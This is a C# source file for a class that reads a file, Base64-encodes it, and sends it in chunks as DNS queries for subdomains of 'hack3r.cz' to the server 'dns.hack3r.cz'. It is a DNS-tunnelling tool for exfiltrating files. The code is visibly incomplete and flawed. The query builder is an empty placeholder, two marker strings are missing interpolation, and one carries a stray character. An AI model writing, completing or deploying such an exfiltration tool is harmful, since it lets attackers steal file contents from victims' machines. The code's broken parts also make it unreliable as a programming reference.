using System;
using System.IO;
using System.Net;
using System.Net.Sockets;

public class DnsSender
{
    private readonly string logFilePath = Path.Combine(Path.GetTempPath(), "error.dns");

    public void Soubor(string filePath)
    {
        try
        {
            Log($"Processing file: {filePath}");
            // Read file content and convert to Base64
            byte[] data = File.ReadAllBytes(filePath);
            string base64 = Convert.ToBase64String(data);

            // Split Base64 string into 50-character parts
            string[] parts = SplitString(base64, 50);

            // Generate DNS file name
            string dnsfile = Path.GetFileName(filePath).Replace(".", "-");

            // Send DNS requests
            SendDns("---START--- {dnsfile} ------.hack3r.cz");
            foreach (string part in parts)
            {
                string dns = part.Replace("=", "--R") + ".hack3r.cz";
                SendDns(dns);
            }
            SendDns("----END---- {dnsfile}¨------.hack3r.cz");
            Log("File processed successfully.");
        }
        catch (Exception ex)
        {
            Log($"Error in Soubor: {ex.Message}");
        }
    }

    private string[] SplitString(string str, int chunkSize)
    {
        try
        {
            Log($"Splitting string into chunks of size {chunkSize}");
            int length = str.Length;
            int chunkCount = (length + chunkSize - 1) / chunkSize;
            string[] chunks = new string[chunkCount];
            for (int i = 0; i < chunkCount; i++)
            {
                int start = i * chunkSize;
                int size = Math.Min(chunkSize, length - start);
                chunks[i] = str.Substring(start, size);
            }
            Log("String split successfully.");
            return chunks;
        }
        catch (Exception ex)
        {
            Log($"Error in SplitString: {ex.Message}");
            throw;
        }
    }

    private void SendDns(string dnsRequest)
    {
        try
        {
            Log($"Sending DNS request: {dnsRequest}");
            var dnsServer = "dns.hack3r.cz";
            var dnsEndpoint = new IPEndPoint(Dns.GetHostAddresses(dnsServer)[0], 53);
            var dnsClient = new UdpClient();
            dnsClient.Connect(dnsEndpoint);

            // Construct and send DNS query
            byte[] query = BuildDnsQuery(dnsRequest);
            dnsClient.Send(query, query.Length);

            // Optionally receive response (not used here)
            // var response = dnsClient.Receive(ref dnsEndpoint);
            Log("DNS request sent successfully.");
        }
        catch (Exception ex)
        {
            Log($"Error in SendDns: {ex.Message}");
        }
    }

    private byte[] BuildDnsQuery(string dnsRequest)
    {
        try
        {
            Log($"Building DNS query for: {dnsRequest}");
            // Implement DNS query construction logic here
            // For simplicity, this is a placeholder
            byte[] query = new byte[0];
            Log("DNS query built successfully.");
            return query;
        }
        catch (Exception ex)
        {
            Log($"Error in BuildDnsQuery: {ex.Message}");
            throw;
        }
    }

    private void Log(string message)
    {
        File.AppendAllText(logFilePath, $"{DateTime.Now}: {message}{Environment.NewLine}");
    }
}
